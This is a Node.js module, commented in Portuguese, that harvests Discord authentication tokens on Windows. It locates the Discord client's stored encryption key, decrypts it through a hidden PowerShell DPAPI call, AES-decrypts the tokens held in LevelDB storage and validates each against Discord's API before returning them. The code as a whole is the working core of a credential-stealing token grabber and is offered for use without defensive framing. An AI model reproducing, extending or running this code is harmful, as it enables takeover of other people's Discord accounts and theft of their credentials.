const fs = require('fs');
const path = require('path');
const { spawn, spawnSync } = require('child_process');
const crypto = require('crypto');

/**
 * Valida se uma token do Discord é válida
 * @param {string} token - Token a ser validada
 * @returns {Promise<string|boolean>} - Nome de usuário ou false
 */
async function validarToken(token) {
	try {
		const tokenLimpo = token.replace(/Bot|Bearer/gi, '').trim();
		const resposta = await fetch('https://discord.com/api/v9/users/@me', {
			headers: {
				Authorization: tokenLimpo
			}
		});

		if (!resposta.ok) {
			return false;
		}

		const dados = await resposta.json();
		return dados.username || false;
	} catch (erro) {
		console.error('Erro ao validar token:', erro.message);
		return false;
	}
}

/**
 * Descriptografa dados usando DPAPI (Windows)
 */
function descriptografarDPAPI(buffer) {
	const entrada = buffer.toString('base64');

	const scriptPS = `
    Add-Type -AssemblyName System.Security;
    $encrypted = [Convert]::FromBase64String("${entrada}");
    $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect(
      $encrypted, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser
    );
    [System.Console]::OutputEncoding = [System.Text.Encoding]::UTF8;
    [System.Convert]::ToBase64String($decrypted);
  `;

	const resultado = spawnSync(
		'powershell.exe',
		['-EncodedCommand', Buffer.from(scriptPS, 'utf16le').toString('base64')],
		{
			encoding: 'utf8',
			windowsHide: true
		}
	);

	if (resultado.status !== 0 || resultado.error) {
		return null;
	}

	try {
		return Buffer.from(resultado.stdout.trim(), 'base64');
	} catch {
		return null;
	}
}

/**
 * Descriptografa usando AES-256-GCM
 */
function descriptografarAES(buffer, chave) {
	try {
		const iv = buffer.slice(3, 15);
		const payload = buffer.slice(15);
		const decipher = crypto.createDecipheriv('aes-256-gcm', chave, iv);
		decipher.setAuthTag(payload.slice(-16));

		const descriptografado = Buffer.concat([decipher.update(payload.slice(0, -16)), decipher.final()]);

		return descriptografado.toString('utf8');
	} catch {
		return null;
	}
}

/**
 * Busca tokens do Discord no Windows
 * @returns {Promise<string[]>} - Array de tokens encontradas
 */
async function buscarTokensWindows() {
	if (process.platform !== 'win32') {
		return [];
	}

	const appData = process.env.APPDATA;
	const caminhosDiscord = [
		{
			nome: 'Discord',
			caminho: path.join(appData, 'discord', 'Local Storage', 'leveldb')
		},
		{
			nome: 'DiscordCanary',
			caminho: path.join(appData, 'discordcanary', 'Local Storage', 'leveldb')
		},
		{
			nome: 'DiscordPTB',
			caminho: path.join(appData, 'discordptb', 'Local Storage', 'leveldb')
		}
	];

	let tokens = [];

	for (const { nome, caminho: caminhoLvl } of caminhosDiscord) {
		if (!fs.existsSync(caminhoLvl)) {
			continue;
		}

		const caminhoLocalState = path.join(appData, nome, 'Local State');
		if (!fs.existsSync(caminhoLocalState)) {
			continue;
		}

		try {
			const localState = JSON.parse(fs.readFileSync(caminhoLocalState, 'utf-8'));
			const chaveEncriptada = Buffer.from(localState.os_crypt.encrypted_key, 'base64').slice(5);

			const chaveDescriptografada = descriptografarDPAPI(chaveEncriptada);
			if (!chaveDescriptografada) {
				continue;
			}

			const arquivos = fs.readdirSync(caminhoLvl).filter((f) => f.endsWith('.ldb') || f.endsWith('.log'));

			for (const arquivo of arquivos) {
				const caminhoCompleto = path.join(caminhoLvl, arquivo);
				const linhas = fs.readFileSync(caminhoCompleto, 'utf-8').split('\n');

				for (const linha of linhas) {
					const match = linha.match(/dQw4w9WgXcQ:[^\"]+/);
					if (match) {
						const dadosBase64 = match[0].split('dQw4w9WgXcQ:')[1];
						const descriptografado = descriptografarAES(Buffer.from(dadosBase64, 'base64'), chaveDescriptografada);

						if (!descriptografado) {
							continue;
						}

						const usuario = await validarToken(descriptografado);
						if (usuario) {
							tokens.push(descriptografado);
						}
					}
				}
			}
		} catch (erro) {
			console.error(`Erro ao processar ${nome}:`, erro.message);
			continue;
		}
	}

	return [...new Set(tokens)];
}

module.exports = {
	validarToken,
	buscarTokensWindows
};
